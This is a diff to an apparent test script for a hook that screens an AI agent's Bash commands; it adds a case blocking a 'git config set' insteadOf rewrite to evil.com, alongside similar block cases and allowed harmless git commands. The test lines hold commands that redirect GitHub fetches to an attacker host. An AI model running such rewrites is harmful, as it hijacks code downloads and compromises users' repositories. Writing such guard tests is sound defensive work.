@@ -84,6 +84,7 @@ check "config --global insteadOf rewrite" block '{"tool_name":"Bash","tool_input
 check "config insteadof case variant" block '{"tool_name":"Bash","tool_input":{"command":"git config URL.https://evil.com/.INSTEADOF https://github.com/","cwd":"'"$SWR"'"}}'
 check "git -c insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git -c url.https://evil.com/.insteadOf=https://github.com/ fetch","cwd":"'"$SWR"'"}}'
 check "git --config-env insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git --config-env=url.https://evil.com/.insteadOf=R fetch","cwd":"'"$SWR"'"}}'
+check "git config set insteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config set url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
 check "config --get insteadOf READ allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config --get url.https://x/.insteadOf","cwd":"'"$SWR"'"}}'
 check "config user.name allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config user.name x","cwd":"'"$SWR"'"}}'
 check "remote -v allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git remote -v","cwd":"'"$SWR"'"}}'
